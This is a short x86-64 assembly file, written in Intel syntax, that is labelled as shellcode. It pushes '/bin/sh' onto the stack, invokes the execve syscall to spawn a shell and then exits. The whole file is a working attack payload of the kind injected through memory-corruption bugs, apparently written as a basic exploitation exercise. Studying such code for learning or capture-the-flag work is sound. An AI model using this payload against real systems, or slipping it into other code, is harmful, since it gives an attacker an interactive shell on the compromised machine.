 .global _start

_start:
    .intel_syntax noprefix
    #execve("/bin/sh". 0,0) shellcode
    mov rax, 0x3b  # execve syscall number
    mov rcx, 0x68732f6e69622f # "/bin/sh" string
    push rcx
    mov rdi, rsp # rsp is a pointer to /bin/sh so rdi will also be a pointer after
    xor rsi, rsi # arg1=0
    mov rdx, rsi # rg2=0
    syscall
    # exit(0) syscall
    mov rax, 0x3c
    xor rdi, rdi
    syscall

